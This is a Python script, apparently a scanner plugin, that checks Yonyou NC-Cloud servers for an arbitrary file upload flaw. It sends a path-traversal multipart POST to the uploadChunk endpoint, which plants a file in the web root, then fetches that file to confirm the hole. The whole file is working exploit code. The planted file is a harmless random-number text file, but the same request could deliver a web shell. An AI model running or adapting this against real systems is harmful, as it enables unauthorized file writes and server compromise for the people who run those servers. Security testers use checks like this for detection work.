import requests
import urllib

from inc.generate_random import generate_random_number


def verify(url):
    relsult = {
        'name': '用友NC-Cloud uploadChunk 任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Content-Type': 'multipart/form-data; boundary=024ff46f71634a1c9bf8ec5820c26fa9'
    }
    num = generate_random_number(6)
    num_data = generate_random_number(12)
    data = f'''--024ff46f71634a1c9bf8ec5820c26fa9--
    Content-Disposition: form-data; name="file"; filename="{num}.txt"

    {num_data}
    --024ff46f71634a1c9bf8ec5820c26fa9--'''
    vurl = urllib.parse.urljoin(url, "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            vurl = url + f'/nccloud/{num}.txt'
            response = requests.get(vurl)
            if response.status_code == 200 and num_data in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult